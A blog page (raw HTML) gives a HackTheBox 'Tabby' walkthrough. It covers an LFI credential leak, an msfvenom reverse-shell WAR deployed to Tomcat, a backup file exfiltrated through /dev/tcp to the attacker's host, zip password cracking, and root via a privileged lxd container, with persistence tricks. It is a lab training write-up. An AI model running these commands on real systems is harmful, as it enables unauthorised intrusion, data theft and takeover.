<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Tabby | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Cyber Security,Pentesting"><meta name=description content="Abusing Tomcat manager-script roles and escalate to root with LXC container"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.medium.com/hack-the-box-tabby-10-10-10-194-scratch-27ec40161646><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Tabby"><meta property="og:description" content="Abusing Tomcat manager-script roles and escalate to root with LXC container"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/tabby/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/tabby/imgs/image-20210427013731264.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2020-11-07T13:34:34+00:00"><meta property="article:modified_time" content="2021-04-26T21:26:38+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/atom/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/tabby/imgs/image-20210427013731264.png"><meta name=twitter:title content="HackTheBox - Tabby"><meta name=twitter:description content="Abusing Tomcat manager-script roles and escalate to root with LXC container"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Tabby","item":"https://fahmifj.github.io/hackthebox/tabby/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Tabby","name":"HackTheBox - Tabby","description":"Abusing Tomcat manager-script roles and escalate to root with LXC container","keywords":["HackTheBox","CTF","Cyber Security","Pentesting"],"articleBody":"Tabby is an easy Linux box that starts off by identifying and leveraging an LFI vulnerability to find tomcat credentials. The credentials can be used to gain a foothold on the system by deploying a malicious .war file via Tomcat Manager. Internal enumeration finds a password protected backup file, and it can be cracked to recover the password. The password turns out to be reused by the user on the box. The user is a member of the lxd group, and this group can be leveraged to gain root access.\nSkills Learned Local File Inclusion Abusing Tomcat manager-script roles Privilege escalation with lxc/lxd group. Tools Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux BurpSuite - https://portswigger.net/burp curl - Preinstalled in Kali Linux msfvenom - Preinstalled in Kali Linux alpine-builder - https://github.com/saghul/lxd-alpine-builder Reconnaissance Nmap → root@iamf «tabby» «10.10.14.30» $ nmap -sC -sV -oA nmap/initial-tabby 10.10.10.194 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 09:48:49 2020 -- 1 IP address (1 host up) scanned in 31.77 seconds An initial nmap scan discovered three open ports: 22 (SSH), 80 (HTTP), and 8080 (HTTP).\nEnumeration TCP 80 - Website Visiting port 80 shows a company website that offers hosting services called “Mega Hosting”.\nThe domain name of this site is revealed from the email address and also from the page source\nI’ll add megahosting.htb to /etc/hosts file.\n10.10.10.194 megahosting.htb The company statement about data breach points to this link http://megahosting.htb/news.php?file=statement.\nThey mentioned a tool, but I have no idea what tool it is.\nI ran gobuster but found nothing really interesting there.\nTCP 8080 - Tomcat Visiting port 8080 shows the Tomcat default page.\nBoth “manager webapp” and “host-manager webapp” are asking for credentials. I tried using Tomcat’s default credentials, but it didn’t work.\nI’ll take note on these:\n/etc/tomcat9/tomcat-users.xml “tomcat9” Foothold Shell as tomcat Getting tomcat Credentials via LFI I found out the file parameter on http://megahosting.htb/news.php?file=statement is vulnerable to LFI.\nThe LFI can be identified by assuming the website is hosted at /var/www/html/megahosting/. So the payload would be ../../../../file/to/read\nThis can be leveraged to read tomcat-users.xml under /etc/tomcat9/ . But, the file is not there, it returns a blank page.\nWith basic Linux knowledge and service fingerprint from the nmap result, I can search for the exact location of the installed Tomcat.\nFirst, in Linux, every software application is most likely installed in one of the following directories:\n/usr/share/appname /usr/lib/appname /opt/appname /var/lib/appname Second, according to the nmap result, OpenSSH version 8.2p1 and Apache version 2.4.41. Therefore, I can guess the box is most likely running Ubuntu 20.04 (Focal Fossa). Now I can just narrow the search, and find the install location of Tomcat9 on Ubuntu 20.04.\nThe search came up with this path /usr/share/tomcat9/etc/tomcat-users.xml. When I visit that path, I get the following results:\nThe credentials is tomcat:$3cureP4s5w0rd123!\nHTML GUI - host-manager-webapp When I tried to access the host-manager-webapp with default credentials, the page says something about the roles that concerns me.\nSo, based on the tomcat-users.xml file, tomcat has two roles, admin-gui and manager-script. That means the credentials is not authorized on manager-webapp (/manager), but it will work on host-manager-webapp (/host-manager),\nAnother interesting one is, if I clicked the Server Status from /host-manager it just redirects me to http://10.10.10.194:8080/manager/status/all, and it doesn’t complain about the authorization.\nSo, I think I can access some features behind /manager/[here].\nDeploying Malicious WAR file The second role of user tomcat is manager-script. This article explains that manager-script provides all the functionality that manager-gui provides but using the text interface instead of the HTML GUI. The full documentation of what you can do with this role can be read here.\nWith manager-script role, there is a deploy feature that provides the ability to deploy a java web application packaged as WAR files. I can abuse this deploy feature to deploy a malicious .war file that is embedded with JSP reverse shell.\nFirst, I’ll craft a .war file payload using msfvenom.\n→ root@iamf «tabby» «10.10.14.30» $ msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.30 lport=9000 -f war -o iamf.war Then I’ll upload the payload using curl.\n→ root@iamf «tabby» «10.10.14.30» $ curl -u 'tomcat:$3cureP4s5w0rd123!' -T iamf.war http://10.10.10.194:8080/manager/text/deploy?path=/iamf.war -u : for credential [username:password] -T : for transfer file I’ll setup a listener, and then trigger the payload also using curl.\n→ root@iamf «tabby» «10.10.14.30» $ curl http://10.10.10.194:8080/iamf.war My listener now have a shell.\nI can upgrade the shell into TTY using this trick.\n$ script /dev/null; bash Privilege Escalation Shell as ash Enumeration Manual enumeration with the find command discovered a backup file in zip format that is owned by user ash\ntomcat@tabby:/$ find / -type f -user ash 2\u003e/dev/null | grep -v 'proc' I’ll transfer the backup file to my Kali.\ntomcat@tabby:/$ cat /var/www/html/files/16162020_backup.zip \u003e /dev/tcp/10.10.14.30/9001 And receive it on my listener.\n→ root@iamf «tabby» «10.10.14.30» $ nc -nvlp 9001 \u003e 16162020_backup.zip listening on [any] 9001 ... connect to [10.10.14.30] from (UNKNOWN) [10.10.10.194] 65056 Recover Backup Password The backup file is protected by a password. I’ll try to recover the password using John the Ripper from my Windows machine, but first I’ll have to convert it to hash format using zip2john.\n→ root@iamf «tabby» «10.10.14.30» $ zip2john 16162020_backup.zip \u003e backup.hash The password got cracked instantly.\n$ john.exe --wordlist=rockyou.txt backup.hash The password is admin@it.\nSU - ash It turns out that the backup password is reused by ash\ntomcat@tabby:/$ su ash su ash Password: admin@it I’ll put my SSH public key to the authorized_keys file on ash home directory for better shell.\nash@tabby:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1y....H/y1qmY6ipsfAec=' \u003e authorized_keys Now I can login with my key.\n→ root@iamf «tabby» «10.10.14.30» $ ssh -i id_rsa ash@10.10.10.194 ash@tabby:~$ ash@tabby:~$ sudo -l [sudo] password for ash: Sorry, user ash may not run sudo on tabby. ash@tabby:~$ id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) Shell as root Abusing lxc I found out that user ash is a member of the lxd group. This group can be abused by mounting the whole root file system into a container, and then I can access it freely from inside the container.\nIt holds the same concept as Hack The Box - Cache (on progress..) that uses docker for the root part by mounting / (root file system) to the container and interacting with it from inside the container as a privileged user.\nI’ll use this article as reference.\nFirst, I’ll create an alpine image on my attacking machine, which is Kali Linux.\n→ root@iamf «tabby» «10.10.14.30» $ git clone https://github.com/saghul/lxd-alpine-builder → root@iamf «tabby» «10.10.14.30» $ cd lxd-alpine-builder → root@iamf «tabby» «10.10.14.30» $ ./build-alpine Once it’s done, there will be an image file called alpine-v3.12-x86_64-blablabla. In my case, it is alpine-v3.12-x86_64-20201107_1900.tar.gz. I’ll send the image to Tabby via scp.\n→ root@iamf «tabby» «10.10.14.30» $ scp -i id_rsa alpine-v3.12-x86_64-20201107_1900.tar.gz ash@10.10.10.194:/tmp I’ll initialize the lxd (storage pool, profile, etc..).\nash@tabby:~$ lxd init I’ll import the image, and then initialize a container with security.privileged enabled from it.\nash@tabby:~$ lxc image import /tmp/alpine-v3.12-x86_64-20201107_1900.tar.gz --alias iamf-img ash@tabby:~$ lxc init iamf-img img-container -c security.privileged=true Next, I’ll mount the root file system of the host to the container at /mnt/root.\nash@tabby:~$ lxc config device add img-container iamf-test disk source=/ path=/mnt/root Device iamf-test added to img-container After that, I’ll start the container. I can confirm it is running using lxc ls.\nash@tabby:~$ lxc start img-container Now I can just interact with the container and grab the root flag on /mnt/root/root/root.txt\nash@tabby:~$lxc exec img-container /bin/sh Modifications on /mnt/root/ will also affect the root file system of the host. Other things I can do from the container is:\nAdding a persistent user via /etc/passwd (/mnt/root/etc/passwd) Adding a SUID bash (cp bash /mnt/root/dev/shm/bash; chmod 4755 /mnt/root/dev/shm/bash) Enabling root login and put my SSH public key to the root authorized_keys file. ","wordCount":"1331","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/tabby/imgs/image-20210427013731264.png","datePublished":"2020-11-07T13:34:34.953Z","dateModified":"2021-04-26T21:26:38+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/tabby/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Tabby</h1><p class=post-description>Abusing Tomcat manager-script roles and escalate to root with LXC container</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>November 07, 2020
<span class=date-update>(Imported: April 26, 2021)</span></span>&nbsp;&#183;&nbsp;<span class=meta-read>7 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li><li><a href=#tcp-8080---tomcat aria-label="TCP 8080 - Tomcat">TCP 8080 - Tomcat</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-tomcat aria-label="Shell as tomcat">Shell as tomcat</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-ash aria-label="Shell as ash">Shell as ash</a></li><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/tabby/imgs/image-20210427013731264_hu7d62732199a98917493b29f1132b5a06_171162_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/tabby/imgs/image-20210427013731264_hu7d62732199a98917493b29f1132b5a06_171162_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/tabby/imgs/image-20210427013731264_hu7d62732199a98917493b29f1132b5a06_171162_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/tabby/imgs/image-20210427013731264.png 743w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/tabby/imgs/image-20210427013731264.png alt="Hack The Box - Tabby" width=743 height=471><p>Hack The Box - Tabby</p></figure><p>Tabby is an easy Linux box that starts off by identifying and leveraging an LFI vulnerability to find tomcat credentials. The credentials can be used to gain a foothold on the system by deploying a malicious <code>.war</code> file via Tomcat Manager. Internal enumeration finds a password protected backup file, and it can be cracked to recover the password. The password turns out to be reused by the user on the box. The user is a member of the lxd group, and this group can be leveraged to gain root access.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Local File Inclusion</li><li>Abusing Tomcat <code>manager-script</code> roles</li><li>Privilege escalation with lxc/lxd group.</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Kali Linux (Attacking Machine) - <a href=https://www.kali.org/>https://www.kali.org/</a></li><li>Nmap - Preinstalled in Kali Linux</li><li>BurpSuite - <a href=https://portswigger.net/burp>https://portswigger.net/burp</a></li><li>curl - Preinstalled in Kali Linux</li><li>msfvenom - Preinstalled in Kali Linux</li><li>alpine-builder - <a href=https://github.com/saghul/lxd-alpine-builder>https://github.com/saghul/lxd-alpine-builder</a></li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «tabby» «10.10.14.30»
</span></span><span class=line><span class=cl>$ nmap -sC -sV -oA nmap/initial-tabby 10.10.10.194
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span class=m>4</span> <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp   open  http    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Mega Hosting
</span></span><span class=line><span class=cl>8080/tcp open  http    Apache Tomcat
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Apache Tomcat
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Sat Jun 27 09:48:49 2020 -- 1 IP address (1 host up) scanned in 31.77 seconds</span>
</span></span></code></pre></div><p>An initial <code>nmap</code> scan discovered three open ports: 22 (SSH), 80 (HTTP), and 8080 (HTTP).</p><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>Visiting port 80 shows a company website that offers hosting services called &ldquo;Mega Hosting&rdquo;.</p><p><div class=img-container><img src=imgs/19847b521b1c48b08f57e8e4986fcc06.png alt=19847b521b1c48b08f57e8e4986fcc06></div></p><p>The domain name of this site is revealed from the email address and also from the page source</p><p><div class=img-container><img src=imgs/image-20210426220259010.png alt=image-20210426220259010></div></p><p>I&rsquo;ll add <code>megahosting.htb</code> to <code>/etc/hosts</code> file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>10.10.10.194 megahosting.htb
</span></span></code></pre></div><p>The company statement about data breach points to this link <code>http://megahosting.htb/news.php?file=statement</code>.</p><p><div class=img-container><img src=imgs/image-20210426215350459.png alt=image-20210426215350459></div></p><p>They mentioned a tool, but I have no idea what tool it is.</p><p>I ran gobuster but found nothing really interesting there.</p><h3 id=tcp-8080---tomcat>TCP 8080 - Tomcat<a class=anchor aria-hidden=true href=#tcp-8080---tomcat>#</a></h3><p>Visiting port 8080 shows the Tomcat default page.</p><p><div class=img-container><img src=imgs/09afc545cd1943dbb578574d338d0943.png alt=09afc545cd1943dbb578574d338d0943></div></p><p>Both &ldquo;manager webapp&rdquo; and &ldquo;host-manager webapp&rdquo; are asking for credentials. I tried using Tomcat&rsquo;s default credentials, but it didn&rsquo;t work.</p><p><div class=img-container><img src=imgs/0aedd7409c3444a3bb359bb837b33c93.png alt=0aedd7409c3444a3bb359bb837b33c93></div></p><p>I&rsquo;ll take note on these:</p><ul><li>/etc/tomcat9/tomcat-users.xml</li><li>&ldquo;tomcat9&rdquo;</li></ul><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-tomcat>Shell as tomcat<a class=anchor aria-hidden=true href=#shell-as-tomcat>#</a></h3><h4 id=getting-tomcat-credentials-via-lfi>Getting tomcat Credentials via LFI<a class=anchor aria-hidden=true href=#getting-tomcat-credentials-via-lfi>#</a></h4><p>I found out the file parameter on <code>http://megahosting.htb/news.php?file=statement</code> is vulnerable to LFI.</p><blockquote><p>The LFI can be identified by assuming the website is hosted at <code>/var/www/html/megahosting/</code>. So the payload would be ../../../../file/to/read</p></blockquote><img src=imgs/42fb887abe344db48a138d3b7707cf5d.png alt=42fb887abe344db48a138d3b7707cf5d style=zoom:80%><p>This can be leveraged to read <code>tomcat-users.xml</code> under <code>/etc/tomcat9/</code> . But, the file is not there, it returns a blank page.</p><img src=imgs/efc8b8670fa0473085bfd66dad7670f2.png alt=efc8b8670fa0473085bfd66dad7670f2 style=zoom:80%><p>With basic Linux knowledge and service fingerprint from the <code>nmap</code> result, I can search for the exact location of the installed Tomcat.</p><p>First, in Linux, every software application is most likely installed in one of the following directories:</p><ul><li><code>/usr/share/appname</code></li><li><code>/usr/lib/appname</code></li><li><code>/opt/appname</code></li><li><code>/var/lib/appname</code></li></ul><p>Second, according to the <code>nmap</code> result, <a href="https://packages.ubuntu.com/search?suite=default&section=all&arch=any&keywords=OpenSSH+8.2p1&searchon=all">OpenSSH version 8.2p1</a> and <a href="https://packages.ubuntu.com/search?suite=default&section=all&arch=any&keywords=apache2+2.4.41&searchon=all">Apache version 2.4.41</a>. Therefore, I can guess the box is most likely running Ubuntu 20.04 (Focal Fossa). Now I can just narrow the <a href="https://packages.ubuntu.com/search?suite=default&section=all&arch=any&keywords=tomcat9&searchon=all">search</a>, and find the install location of <a href=https://packages.ubuntu.com/focal/all/tomcat9/filelist>Tomcat9 on Ubuntu 20.04</a>.</p><p>The search came up with this path <code>/usr/share/tomcat9/etc/tomcat-users.xml</code>. When I visit that path, I get the following results:</p><p><div class=img-container><img src=imgs/531dc2a899f54b368f3fdadb83623272.png alt=531dc2a899f54b368f3fdadb83623272></div></p><p>The credentials is <code>tomcat:$3cureP4s5w0rd123!</code></p><h4 id=html-gui---host-manager-webapp>HTML GUI - host-manager-webapp<a class=anchor aria-hidden=true href=#html-gui---host-manager-webapp>#</a></h4><p>When I tried to access the host-manager-webapp with default credentials, the page says something about the roles that concerns me.</p><p><div class=img-container><img src=imgs/image-20210426232907769.png alt=image-20210426232907769></div></p><p>So, based on the <code>tomcat-users.xml</code> file, <code>tomcat</code> has two roles, <code>admin-gui</code> and <code>manager-script</code>. That means the credentials is not authorized on manager-webapp (<code>/manager</code>), but it will work on host-manager-webapp (<code>/host-manager</code>),</p><p><div class=img-container><img src=imgs/102088bcbb8b46a79a0f333b027bcaa2.png alt=102088bcbb8b46a79a0f333b027bcaa2></div></p><p>Another interesting one is, if I clicked the Server Status from <code>/host-manager</code> it just redirects me to <code>http://10.10.10.194:8080/manager/status/all</code>, and it doesn&rsquo;t complain about the authorization.</p><p><div class=img-container><img src=imgs/314b3cdbc1964a699afeb20044dbc792.png alt=314b3cdbc1964a699afeb20044dbc792></div></p><p>So, I think I can access some features behind <code>/manager/[here]</code>.</p><h4 id=deploying-malicious-war-file>Deploying Malicious WAR file<a class=anchor aria-hidden=true href=#deploying-malicious-war-file>#</a></h4><p>The second role of user tomcat is <code>manager-script</code>. <a href=https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html>This article</a> explains that <code>manager-script</code> provides all the functionality that manager-gui provides but using the text interface instead of the HTML GUI. The full documentation of what you can do with this role can be read <a href=http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands>here</a>.</p><p>With <code>manager-script</code> role, there is a deploy feature that provides the ability to deploy a java web application packaged as WAR files. I can abuse this deploy feature to deploy a malicious <code>.war</code> file that is embedded with JSP reverse shell.</p><p>First, I&rsquo;ll craft a <code>.war</code> file payload using <code>msfvenom</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «tabby» «10.10.14.30»
</span></span><span class=line><span class=cl>$ msfvenom -p java/jsp_shell_reverse_tcp <span class=nv>lhost</span><span class=o>=</span>10.10.14.30 <span class=nv>lport</span><span class=o>=</span><span class=m>9000</span> -f war -o iamf.war
</span></span></code></pre></div><p>Then I&rsquo;ll upload the payload using <code>curl</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «tabby» «10.10.14.30»
</span></span><span class=line><span class=cl>$ curl -u <span class=s1>&#39;tomcat:$3cureP4s5w0rd123!&#39;</span> -T iamf.war http://10.10.10.194:8080/manager/text/deploy?path<span class=o>=</span>/iamf.war
</span></span></code></pre></div><ul><li><code>-u</code> : for credential [username:password]</li><li><code>-T</code> : for transfer file</li></ul><p>I&rsquo;ll setup a listener, and then trigger the payload also using <code>curl</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «tabby» «10.10.14.30»
</span></span><span class=line><span class=cl>$ curl http://10.10.10.194:8080/iamf.war
</span></span></code></pre></div><p>My listener now have a shell.</p><p><div class=img-container><img src=https://cdn-images-1.medium.com/max/1000/1*TG4UfRosbeX5ncZtEoIVng.png alt=img></div></p><p>I can upgrade the shell into TTY using this trick.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ script /dev/null<span class=p>;</span> bash
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-ash>Shell as ash<a class=anchor aria-hidden=true href=#shell-as-ash>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>Manual enumeration with the <code>find</code> command discovered a backup file in zip format that is owned by user <code>ash</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tomcat@tabby:/$ find / -type f -user ash 2&gt;/dev/null <span class=p>|</span> grep -v <span class=s1>&#39;proc&#39;</span>
</span></span></code></pre></div><p><div class=img-container><img src=imgs/47eaa7bb176b445fa6a091ac49e5f32f.png alt=47eaa7bb176b445fa6a091ac49e5f32f></div></p><p>I&rsquo;ll transfer the backup file to my Kali.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>tomcat@tabby:/$ cat /var/www/html/files/16162020_backup.zip &gt; /dev/tcp/10.10.14.30/9001
</span></span></code></pre></div><p>And receive it on my listener.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «tabby» «10.10.14.30»
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>9001</span> &gt; 16162020_backup.zip
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9001</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.30<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.194<span class=o>]</span> <span class=m>65056</span>
</span></span></code></pre></div><h4 id=recover-backup-password>Recover Backup Password<a class=anchor aria-hidden=true href=#recover-backup-password>#</a></h4><p>The backup file is protected by a password. I&rsquo;ll try to recover the password using John the Ripper from my Windows machine, but first I&rsquo;ll have to convert it to hash format using <code>zip2john</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «tabby» «10.10.14.30»
</span></span><span class=line><span class=cl>$ zip2john 16162020_backup.zip &gt; backup.hash
</span></span></code></pre></div><p>The password got cracked instantly.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ john.exe --wordlist<span class=o>=</span>rockyou.txt backup.hash
